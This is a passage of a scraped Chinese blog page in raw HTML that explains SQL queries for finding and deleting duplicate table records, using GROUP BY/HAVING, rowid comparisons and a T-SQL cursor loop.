</em> <font color=\"#0000ff\">from</font> testtable</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;where</font> numeber in (<font color=\"#0000ff\">select</font> number <font color=\"#0000ff\">from</font> people <font color=\"#0000ff\">group by</font> number <font color=\"#0000ff\">having count</font>(number) &gt; 1 )</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;可以查出testtable表中number相同的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId&nbsp;)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">3</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段）&nbsp;<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">4</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录（多个字段），只留有rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">5</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段），不包含rowid最小的记录<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(二)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">比方说<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">在A表中存在一个字段“name”，<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">而且不同记录之间的“name”值有可能会相同，<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">现在就是需要查询出在该表中的各记录之间，“name”值存在重复的项；<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果还查性别也相同大则如下:<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,sex,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name,sex&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(三)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法一<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">cursor</span><span style=\"color: #000000\">&nbsp;local&nbsp;</span><span style=\"color: #0000ff\">for</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;主字段,</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">；&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">open</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">while</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #008000\">@@fetch_status</span><span style=\"color: #808080\">=</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">begin</font></span><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">-</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">end</font></span><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">close</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法二<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">　　有两个意义上的重复记录，一是完全重复的记录，也即所有字段均重复的记录，二是部分关键字段重复的记录，比如Name字段重复，而其他字段不一定重复或都重复可以忽略。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img 